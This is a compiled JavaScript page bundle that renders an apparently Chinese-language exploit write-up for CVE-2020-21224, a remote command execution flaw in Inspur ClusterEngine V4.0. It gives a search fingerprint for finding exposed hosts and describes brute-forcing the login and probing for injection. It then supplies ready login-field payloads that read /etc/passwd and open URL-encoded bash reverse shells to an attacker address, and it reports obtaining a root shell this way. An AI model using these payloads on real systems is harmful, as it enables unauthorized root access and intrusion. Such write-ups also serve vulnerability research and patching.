(window.webpackJsonp=window.webpackJsonp||[]).push([[12],{2431:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010782.45b467e3.png"},2432:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010591.ea599ad3.png"},2433:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010607.9fd7359d.png"},2434:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010737.b356de01.png"},2435:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010569.2b572637.png"},2436:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010691.bcaaf085.png"},2437:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010799.7b05fd48.png"},2438:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125011095.4de57e47.png"},2439:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010886.6366fda6.png"},2440:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010997.d7da3d5c.png"},2441:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125010953.85fde8ca.png"},2442:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125011508.d4e702b5.png"},2443:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125011019.2c027f2a.png"},2444:function(a,t,s){a.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125011101.b269a4c2.png"},3232:function(a,t,s){"use strict";s.r(t);var e=s(64),r=Object(e.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"浪潮clusterenginev4-0-远程命令执行漏洞-cve-2020-21224"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#浪潮clusterenginev4-0-远程命令执行漏洞-cve-2020-21224"}},[a._v("#")]),a._v(" 浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224")]),a._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),t("p",[a._v("浪潮服务器群集管理系统存在危险字符未过滤，导致远程命令执行")]),a._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[a._v("浪潮ClusterEngineV4.0")]),t("br"),a._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[a._v('title="TSCEV4.0"')]),t("br"),a._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),t("p",[a._v("登录页面如下")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2431),alt:"img"}})]),a._v(" "),t("p",[a._v("由于登录页面没有发现验证码，进行账号爆破")]),a._v(" "),t("p",[a._v("当burpsuite爆破完成时，注意到POST数据中如果带有 ;' ，响应数据包发生异常。")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2432),alt:"img"}})]),a._v(" "),t("p",[a._v("通过响应包信息，猜测可能存在一个远程执行代码漏洞，并将此数据包放在repeater中，我发现如果发布数据中有")]),a._v(" "),t("p",[a._v("一个 ' ，系统将抛出异常。")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2433),alt:"img"}})]),a._v(" "),t("p",[t("img",{attrs:{src:s(2434),alt:"img"}})]),a._v(" "),t("p",[a._v("进一步测试时，我发现username参数或password任一参数如果包含 ' ，将引发此异常")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2435),alt:"img"}})]),a._v(" "),t("p",[a._v("定尝试发送 ' ' 来查看响应包。")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2436),alt:"img"}})]),a._v(" "),t("p",[a._v("我注意到 grep 命令错误，服务端的代码可能是这样")]),a._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[a._v("var1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("`")]),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("grep")]),a._v(" xxxx"),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("`")])]),a._v(" \nvar2 "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$(")]),a._v("python "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[a._v("\"from crypt import crypt;print crypt('"),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$username")]),a._v("','"),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$1")]),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$$")]),a._v("var1')\"")]),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v(")")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br")])]),t("p",[a._v("尝试发送 -V 和 --help 来查看响应包，响应包证实了猜测")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2437),alt:"img"}})]),a._v(" "),t("p",[t("img",{attrs:{src:s(2438),alt:"img"}})]),a._v(" "),t("p",[a._v("尝试读取  "),t("code",[a._v("/etc/passswd")])]),a._v(" "),t("p",[t("img",{attrs:{src:s(2439),alt:"img"}})]),a._v(" "),t("p",[a._v("尝试列目录")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2440),alt:"img"}})]),a._v(" "),t("p",[a._v("确认存在一个远程执行命令执行漏洞，经过fuzz，得到以下payload")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2441),alt:"img"}})]),a._v(" "),t("p",[t("img",{attrs:{src:s(2442),alt:"img"}})]),a._v(" "),t("p",[a._v("反弹 shell")]),a._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("op")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("login"),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("username")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("2")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("',"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("'1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("'"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("`")]),a._v("bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F80%200%3E%261"),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("`")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("payload发送后, 在 kali linux 服务器上获取了一个 root 权限的 shell")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2443),alt:"img"}})]),a._v(" "),t("p",[a._v("上面是原文的测试思路，但经过重新测试之后发现还有另一种简单方法")]),a._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[a._v('POC测试(出现 root:x:0:0 则存在漏洞)\nop=login&username=test`$(cat /etc/passwd)`\n\n{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n","exitcode":1,"out":"the user test does not exist\\nerror:1\\n"}\n\n反弹shell\nop=login&username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br")])]),t("p",[t("img",{attrs:{src:s(2444),alt:"img"}})]),a._v(" "),t("h2",{attrs:{id:""}},[t("a",{staticClass:"header-anchor",attrs:{href:"#"}},[a._v("#")])])],1)}),[],!1,null,null,null);t.default=r.exports}}]);